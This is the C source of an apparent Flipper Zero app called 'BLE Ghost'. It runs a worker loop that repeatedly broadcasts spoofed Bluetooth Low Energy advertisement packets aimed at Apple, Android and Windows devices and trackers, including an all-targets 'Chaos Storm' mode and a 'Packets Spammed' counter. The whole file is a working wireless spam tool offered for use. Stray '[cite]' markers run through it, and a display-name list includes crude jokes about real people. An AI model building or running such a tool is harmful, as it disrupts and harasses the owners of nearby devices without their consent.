#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/widget.h>
#include <notification/notification_messages.h>
#include <bt/bt_service/bt.h>
#include <furi_hal_bt.h>
#include "ble_payloads.h" //[cite: 3]

typedef enum {
    SubmenuIndexApple,
    SubmenuIndexAndroid,
    SubmenuIndexWindows,
    SubmenuIndexAccessories,
    SubmenuIndexStorm,
} SubmenuIndex;

typedef enum {
    ViewSubmenu,
    ViewWidget,
} ViewType;

typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Widget* widget;
    NotificationApp* notifications;
    volatile bool is_broadcasting;
    uint32_t packet_count;
    uint8_t selected_mode;
    uint8_t speed_profile;
    FuriThread* worker_thread;
} BleGhostApp;

// Custom connection alias pool[cite: 1]
static const char* RANDOM_NAMES[] = {
    "diddy's Vibrator",
    "Epsteins s35 galaxy",
    "Kim jong Un PS5",
    "FBI Surveillance Van #4",
    "Free Wi-Fi (Totally Safe)",
    "JetEngine_Test_Mic",
    "NSA Wiretap Node 9",
    "Get Me Out Of Here",
    "Printer That Hates You",
    "Bluetooth Speaker (Explosive)",
    "Alien Mothership Link",
    "Zuck's Meta Glass",
    "Area 51 Beacon 6",
    "Not A Police Drone",
    "Mom's Smart Fridge",
    "Dark Web Hotspot",
    "Caution: Biohazard",
    "Quantum Teleporter v2",
    "Couch Cushion Lost & Found",
    "Definitely Not A Virus",
    "Broken Microwave ODU"
};

#define RANDOM_NAMES_COUNT (sizeof(RANDOM_NAMES) / sizeof(RANDOM_NAMES[0]))

// Forward declaration
static void ble_ghost_update_widget(BleGhostApp* app);

static int32_t ble_ghost_worker(void* context) {
    BleGhostApp* app = context;
    
    // Give the radio stack a full second to stabilize on entry
    furi_delay_ms(1000);

    while(app->is_broadcasting) {
        // Strict global Bluetooth state guard
        if(!furi_hal_bt_is_active()) {
            furi_delay_ms(500);
            continue;
        }

        const BleMode* mode = &BLE_MODES[app->selected_mode]; //[cite: 3]
        size_t random_index = furi_hal_random_get() % mode->count;
        const BlePayload* payload = &mode->payloads[random_index]; //[cite: 3]

        // Safely cycle extra beacon packets with strict error checks
        furi_hal_bt_extra_beacon_stop();
        furi_delay_ms(20); // Small hardware breathing gap
        
        if(payload && payload->data && payload->size > 0) {
            if(furi_hal_bt_extra_beacon_set_data(payload->data, payload->size)) {
                furi_hal_bt_extra_beacon_start();
                app->packet_count++;
            }
        }
        
        // CONSERVATIVE DELAYS: Drastically slowed down to prevent Core2 hard faults / reboots
        if(app->speed_profile == 1) {
            furi_delay_ms(250 + (furi_hal_random_get() % 100)); // Safe Fast Mode (~250-350ms)
        } else {
            furi_delay_ms(500 + (furi_hal_random_get() % 200)); // Safe Normal Mode (~500-700ms)
        }
    }

    // Ensure beacon is explicitly terminated safely before exiting thread
    if(furi_hal_bt_is_active()) {
        furi_hal_bt_extra_beacon_stop();
    }
    
    return 0;
}

static void ble_ghost_update_widget(BleGhostApp* app) {
    widget_reset(app->widget); //[cite: 1]
    
    const char* random_alias = RANDOM_NAMES[furi_hal_random_get() % RANDOM_NAMES_COUNT];

    char buffer[128];
    snprintf(buffer, sizeof(buffer), "\e#BLE Ghost: %s\n", BLE_MODES[app->selected_mode].category_name); //[cite: 1, 3]
    widget_add_string_element(app->widget, 0, 0, AlignLeft, AlignTop, FontPrimary, buffer); //[cite: 1]

    snprintf(buffer, sizeof(buffer), "Target Alias: %s", random_alias);
    widget_add_string_element(app->widget, 0, 18, AlignLeft, AlignTop, FontSecondary, buffer); //[cite: 1]

    snprintf(buffer, sizeof(buffer), "Packets Spammed: %lu", app->packet_count);
    widget_add_string_element(app->widget, 0, 32, AlignLeft, AlignTop, FontSecondary, buffer); //[cite: 1]

    snprintf(buffer, sizeof(buffer), "Speed: %s", app->speed_profile == 1 ? "Stable Fast" : "Normal");
    widget_add_string_element(app->widget, 0, 48, AlignLeft, AlignTop, FontSecondary, buffer); //[cite: 1]
}

static void submenu_callback(void* context, uint32_t index) {
    BleGhostApp* app = context;
    app->selected_mode = index;
    app->packet_count = 0;
    app->is_broadcasting = true;
    
    // Allocate and start worker thread cleanly with a safe stack size
    app->worker_thread = furi_thread_alloc_ex("BleGhostWorker", 4096, ble_ghost_worker, app); //[cite: 1]
    furi_thread_start(app->worker_thread); //[cite: 1]

    ble_ghost_update_widget(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewWidget); //[cite: 1]
}

static uint32_t view_submenu_exit(void* context) {
    UNUSED(context);
    return VIEW_NONE;
}

static uint32_t view_widget_exit(void* context) {
    BleGhostApp* app = context;
    app->is_broadcasting = false;
    
    if(app->worker_thread) {
        furi_thread_join(app->worker_thread); //[cite: 1]
        furi_thread_free(app->worker_thread); //[cite: 1]
        app->worker_thread = NULL; //[cite: 1]
    }
    return ViewSubmenu;
}

static BleGhostApp* ble_ghost_app_alloc() {
    BleGhostApp* app = malloc(sizeof(BleGhostApp)); //[cite: 1]
    app->gui = furi_record_open(RECORD_GUI); //[cite: 1]
    app->notifications = furi_record_open(RECORD_NOTIFICATION); //[cite: 1]
    
    app->view_dispatcher = view_dispatcher_alloc(); //[cite: 1]
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen); //[cite: 1]

    app->submenu = submenu_alloc(); //[cite: 1]
    submenu_add_item(app->submenu, "Apple Ecosystem", SubmenuIndexApple, submenu_callback, app); //[cite: 1]
    submenu_add_item(app->submenu, "Android & Audio", SubmenuIndexAndroid, submenu_callback, app); //[cite: 1]
    submenu_add_item(app->submenu, "Windows Devices", SubmenuIndexWindows, submenu_callback, app); //[cite: 1]
    submenu_add_item(app->submenu, "Trackers & Remotes", SubmenuIndexAccessories, submenu_callback, app); //[cite: 1]
    submenu_add_item(app->submenu, "Chaos Storm (All Systems)", SubmenuIndexStorm, submenu_callback, app); //[cite: 1]
    
    view_set_previous_callback(submenu_get_view(app->submenu), view_submenu_exit); //[cite: 1]
    view_dispatcher_add_view(app->view_dispatcher, ViewSubmenu, submenu_get_view(app->submenu)); //[cite: 1]

    app->widget = widget_alloc(); //[cite: 1]
    view_set_previous_callback(widget_get_view(app->widget), view_widget_exit); //[cite: 1]
    view_dispatcher_add_view(app->view_dispatcher, ViewWidget, widget_get_view(app->widget)); //[cite: 1]

    app->is_broadcasting = false;
    app->packet_count = 0;
    app->selected_mode = 0;
    app->speed_profile = 1;
    app->worker_thread = NULL;

    return app;
}

static void ble_ghost_app_free(BleGhostApp* app) {
    app->is_broadcasting = false;

    if(app->worker_thread) {
        furi_thread_join(app->worker_thread); //[cite: 1]
        furi_thread_free(app->worker_thread); //[cite: 1]
    }
    
    view_dispatcher_remove_view(app->view_dispatcher, ViewSubmenu); //[cite: 1]
    view_dispatcher_remove_view(app->view_dispatcher, ViewWidget); //[cite: 1]
    submenu_free(app->submenu); //[cite: 1]
    widget_free(app->widget); //[cite: 1]
    view_dispatcher_free(app->view_dispatcher); //[cite: 1]

    furi_record_close(RECORD_NOTIFICATION); //[cite: 1]
    furi_record_close(RECORD_GUI); //[cite: 1]
    free(app); //[cite: 1]
}

int32_t ble_ghost_app(void* p) {
    UNUSED(p);
    BleGhostApp* app = ble_ghost_app_alloc();
    view_dispatcher_switch_to_view(app->view_dispatcher, ViewSubmenu); //[cite: 1]
    view_dispatcher_run(app->view_dispatcher); //[cite: 1]
    ble_ghost_app_free(app); //[cite: 1]
    return 0;
}
